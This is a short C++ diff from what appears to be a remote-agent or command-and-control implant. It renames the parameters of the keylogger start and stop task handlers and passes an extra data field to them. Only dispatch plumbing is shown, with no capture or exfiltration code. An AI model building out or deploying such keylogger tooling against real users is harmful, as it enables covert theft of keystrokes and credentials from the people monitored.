@@ -103,17 +103,17 @@ void Agent::Start()
                     },
 
                     // Handle keylogger start requests.
-                    [this](const TaskRequest<Keylogger> &keyloggerRequest) -> Response
+                    [this](const TaskRequest<Keylogger> &keyloggerStartRequest) -> Response
                     {
                         Keylogger keylogger;
-                        return this->keylogger.keylog_start(keyloggerRequest.taskID);
+                        return this->keylogger.keylog_start(keyloggerStartRequest.taskID, keyloggerStartRequest.data);
                     },
 
                     // Handle keylogger stop requests.
-                    [this](const TaskRequest<Keylogger> &keyloggerRequest) -> Response
+                    [this](const TaskRequest<Keylogger> &keyloggerStopRequest) -> Response
                     {
                         Keylogger keylogger;
-                        return this->keylogger.get_keylog_data(keyloggerRequest.taskID);
+                        return this->keylogger.get_keylog_data(keyloggerStopRequest.taskID, keyloggerStopRequest.data);
                     },
 
                     // Return an error response for explicitly unsupported Boolean tasks.
